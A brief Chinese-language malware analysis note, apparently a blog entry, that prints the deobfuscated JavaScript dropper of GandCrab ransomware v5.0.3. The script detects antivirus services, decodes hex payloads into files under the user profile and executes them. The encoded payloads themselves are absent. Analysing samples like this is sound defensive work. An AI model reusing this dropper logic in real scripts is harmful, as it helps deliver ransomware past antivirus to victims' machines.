---
title: GandCrabV5.0.3的JS脚本分析
--- 

标签（空格分隔）： 脚本恶意代码

---

## 1 样本
MD5：595A31A4913951D3EB7211618AE75DEA
## 2 内容
![](https://i.screenshot.net/dzx8xf7)
## 3 分析
### 3.1 解密shellcode
```
var bewktojmagvc = new ActiveXObject('Scripting.FileSystemObject');
var zevdbpspf = WScript.CreateObject("WScript.Shell");
var zdkthnuxtaw = zevdbpspf.ExpandEnvironmentStrings("%USERPROFILE%") + "\\";
var stwnydqsuji = WScript.CreateObject("shell.application");
function ffnoui(qncrqz, orowv) {
    var vtrcjcffjs = qncrqz.split("").reverse().join("");
    innku = '';
    for (i = 0; i < (vtrcjcffjs.length / 2); i++) {
        innku += String.fromCharCode('0x' + vtrcjcffjs.substr(i * 2, 2));
    }
    var tiwtkeh = new ActiveXObject("ADODB.Stream");
    tiwtkeh.Type = 2;
    tiwtkeh.Charset = "ISO-8859-1";
    tiwtkeh.Open();
    tiwtkeh.WriteText(innku);
    tiwtkeh.SaveToFile(orowv, 2);
    tiwtkeh.Close();
}
function vwuyaxrl(dsncuaz) {
    var orowv = WScript.CreateObject("WScript.Shell");
    var dhoahqls = orowv.Exec(dsncuaz);
    var i = 0;
    while (true) {
        if (dhoahqls.Status == 0) {
            WScript.Sleep(100);
            i++;
        } else break;
        if (i == 1800) {
            dhoahqls.Terminate();
            break;
        }
    }
}
function hmvfdhlkxzz(name) {
    var bakzqkk = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + name + "'");
    vaatgfp = new Enumerator(bakzqkk);
    xcabb = vaatgfp.item();
    var bfdln = '';
    try {
        bfdln = xcabb.State;
    } catch(e) {}
    if (bfdln == 'Running') {
        return true;
    } else {
        return false;
    }
}
if (hmvfdhlkxzz('avast! Antivirus')) {
    ffnoui(pjqssmaj, zdkthnuxtaw + 'kyoxks.js');
    try {
        vwuyaxrl('wscript.exe "' + zdkthnuxtaw + 'kyoxks.js"');
    } catch(e) {}
    WScript.sleep(15000);
}
if ((hmvfdhlkxzz('WdNisSvc')) || (hmvfdhlkxzz('WinDefend'))) {
    ffnoui(wvspotnpwm, zdkthnuxtaw + 'nykvwcajm.js');
    try {
        vwuyaxrl('wscript.exe "' + zdkthnuxtaw + 'nykvwcajm.js"');
    } catch(e) {}
}
if (hmvfdhlkxzz('NisSrv')) {
    ffnoui(hoszxms, zdkthnuxtaw + 'bervcptyvulur.js');
    try {
        vwuyaxrl('wscript.exe "' + zdkthnuxtaw + 'bervcptyvulur.js"');
    } catch(e) {}
}
if (hmvfdhlkxzz('V3 Service')) {
    if (bewktojmagvc.FileExists(zdkthnuxtaw + "tgydmilslvp.txt")) {
        ffnoui(mvqwaqu, zdkthnuxtaw + 'recjyzcz.js');
        try {
            vwuyaxrl('wscript.exe "' + zdkthnuxtaw + 'recjyzcz.js"');
        } catch(e) {}
    } else {
        ffnoui('727272', zdkthnuxtaw + 'tgydmilslvp.txt');
        try {
            vwuyaxrl('wscript.exe "' + WScript.ScriptFullName + '"');
        } catch(e) {}
        WScript.Quit();
    }
}
ffnoui(xtaqukamdxzx, zdkthnuxtaw + 'dsoyaltj.exe');
if (bewktojmagvc.FileExists(zdkthnuxtaw + "dsoyaltj.exe")) {
    try {
        stwnydqsuji.ShellExecute('"' + zdkthnuxtaw + "dsoyaltj.exe" + '"', '', "", "open", 1);
    } catch(e) {}
}
```
# 有的时候真的想砍人，分析到一半去写需求



